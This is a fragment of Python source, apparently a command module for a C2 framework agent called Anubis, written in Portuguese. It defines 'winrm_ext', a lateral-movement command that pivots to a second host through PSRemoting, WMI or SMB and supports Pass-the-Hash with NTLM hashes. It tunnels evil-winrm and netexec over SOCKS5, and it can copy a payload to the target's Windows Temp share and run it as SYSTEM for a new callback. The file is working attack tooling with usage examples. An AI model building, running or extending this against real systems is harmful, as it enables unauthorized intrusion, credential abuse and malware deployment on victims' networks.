    ...
    def __init__(self, command_line, **kwargs):
        ...
        self.args = [
            ...
            CommandParameter(
                ...
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Senha em texto claro (bootstrap remote e acesso).",
                default_value="",
            ),
            CommandParameter(
                name="nthash",
                ...
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "NTLM hash para Pass-the-Hash (32 hex NT ou LM:NT). "
                    "Quando informado, os comandos de acesso usam -H (evil-winrm/nxc). "
                    "Bootstrap remote (A→B) ainda exige password se WinRM estiver fechado."
                ),
                default_value="",
            ),
            CommandParameter(
...
class WinrmExtCommand(CommandBase):
    ...
    help_cmd    = (
        ...
        "winrm_ext {\"remote\":\"IP\",\"username\":\"u\",\"password\":\"p\"|\"nthash\":\"H\",\"domain\":\"D\"}"
    )
    description = (
        ...
        "SOCKS5 (T1021.006/T1090). Suporta Pass-the-Hash (nthash) para acesso.\n\n"
        ...
        "  6. TCP probe → retorna evil-winrm/netexec (password ou -H nthash) via SOCKS5\n\n"
        "Remote (A→B, a partir do agente):\n"
        "  winrm_ext {\\\"remote\\\":\\\"10.0.0.5\\\",\\\"username\\\":\\\"adm\\\","
        "\\\"password\\\":\\\"P@ss\\\",\\\"domain\\\":\\\"CORP\\\"}\n"
        "  PtH acesso: {\\\"remote\\\":\\\"10.0.0.5\\\",\\\"username\\\":\\\"adm\\\","
        "\\\"nthash\\\":\\\"31d6cfe0...\\\",\\\"domain\\\":\\\"CORP\\\"}\n"
        "  Cadeia de bootstrap: PSRemoting → WMI (CIM) → SMB (reg+SCM+schtasks).\n"
        "  Bootstrap A→B com WinRM fechado ainda exige password; com WinRM já aberto "
        "basta nthash para gerar comandos de acesso PtH.\n"
        "  Com \\\"deploy\\\": caminho do payload do Anubis no HOST-A → copia para "
        "\\\\B\\C$\\Windows\\Temp e executa como SYSTEM (novo callback).\n\n"
        "Pass-the-Hash (nthash):\n"
        "  Aceita 32 hex (NT) ou LM:NT (65 chars). evil-winrm/nxc usam -H.\n"
        "  Preferência: se nthash e password forem passados, acesso prioriza -H.\n\n"
        "Extras:\n"
        ...
        "  apt install evil-winrm   # shell interativo WinRM (-H para hash)\n"
        "  pipx install netexec      # nxc winrm -H (SOCKS5 nativo)\n\n"
        "Detecção no alvo:\n"
    ...
    version               = 2
    author                = "@wtechsec"
    attackmapping         = ["T1021.006", "T1090", "T1550.002", "T1562.004", "T1136.001", "T1570"]
    ...
    async def create_go_tasking(
        ...
        nthash     = taskData.args.get_arg("nthash")     or ""
        ...
        if nthash:
            auth_mode = " PtH"
        elif taskData.args.get_arg("password"):
            auth_mode = " pass"

        if remote:
            response.DisplayParams = "REMOTO {}{}{} deploy={}".format(
                remote, user_str, auth_mode, deploy or "-")
        else:
            response.DisplayParams = "self-host {}:{}{}{}".format(
                target or "<IP do agente>", port, user_str, auth_mode)
        return response
